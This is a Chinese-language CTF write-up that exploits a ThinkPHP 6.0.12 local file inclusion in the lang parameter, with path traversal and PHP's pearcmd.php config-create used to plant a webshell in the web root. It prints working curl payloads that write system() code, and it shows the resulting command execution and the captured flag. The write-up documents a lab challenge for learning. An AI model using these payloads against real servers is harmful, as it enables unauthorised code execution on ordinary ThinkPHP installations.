📝 ThinkPHP 6.0.12 LFI 导致 RCE 实战 Writeup：pearcmd.php 写马与目录穿越

一、 靶机信息与漏洞简介

· 靶机环境：ThinkPHP 6.0.12LTS
· 漏洞类型：本地文件包含 (LFI) -> 远程代码执行 (RCE)
· 漏洞原理：ThinkPHP 6 的多语言功能（lang 参数）存在本地文件包含漏洞。攻击者可以通过控制 lang 参数，包含服务器上的任意文件。当直接包含 php://filter 或者日志读取失败时，可以利用 PHP 环境自带的 pearcmd.php 工具，通过其 config-create 功能向服务器写入恶意木马文件，然后再包含该文件实现代码执行。

二、 渗透过程详解

1. 尝试直接 LFI 读取敏感文件

靶机提示了环境变量注入以及 /proc/1/environ，首先尝试直接利用 lang 参数进行文件包含读取环境变量：

http
http://direct-ctf2.dasctf.com:29446/index.php?lang=../../../../../../proc/1/environ


结果：页面返回 ThinkPHP 默认首页，lang 参数未生效。随后尝试通过 HTTP 请求头 Accept-Language 和 Cookie 注入，均返回首页。

2. 发现路由限制，尝试写入木马

既然直接包含文件会被框架吞掉，决定利用 pearcmd.php 在服务器上写一个 WebShell。
Payload 构造思路是包含 pearcmd.php 并传入 config-create 参数，尝试将 <?=system("env");?> 写入文件：

bash
curl -s 'http://direct-ctf2.dasctf.com:29446/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=system("env");?>+/tmp/shell.php'


结果：成功回显 PEAR CONFIGURATION，并在终端提示 Successfully created default configuration file "/tmp/shell.php"，说明写入成功。但随后尝试包含 /tmp/shell（框架会自动补全 .php）时，依然返回首页。

3. 关键转折：定位真实 Web 目录

根据之前打 SQL 注入题的环境变量线索，得知该靶机环境的 Apache 根目录是 /var/www/public。
修改写入路径，将木马直接写进 Web 根目录：

bash
curl -s 'http://direct-ctf2.dasctf.com:29446/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=system("env");?>+/var/www/public/shell.php'


终端再次提示 Successfully created default configuration file "/var/www/public/shell.php"。

4. 访问木马，获取 Flag

直接在浏览器中访问刚刚写入的木马：
http://direct-ctf2.dasctf.com:29446/shell.php
页面成功执行了 env 命令，打印出大量环境变量信息，在左上角找到了 Flag：
FLAG=CTF2{68b74e02-c64a-4bbc-8497-ec1c1d0a7189}

三、 总结与反思

1. LFI 的常规套路：遇到 LFI 无法直接包含读取时，优先测试 pearcmd.php 写马或日志包含。利用 pearcmd 是 CTF 中绕过限制生成木马的最经典手法。
2. 信息收集的重要性：本题最关键的一步，是成功回忆并利用了之前获取的 APACHE_DOCUMENT_ROOT=/var/www/public 线索。说明在渗透测试中，前期收集到的任何细枝末节的情报，都有可能在关键时刻派上用场。
3. 文件路径的试错：如果写入 /var/www/html/public 报错找不到目录，要学会根据环境变量及时调整思路，寻找真实的 Web 服务目录。
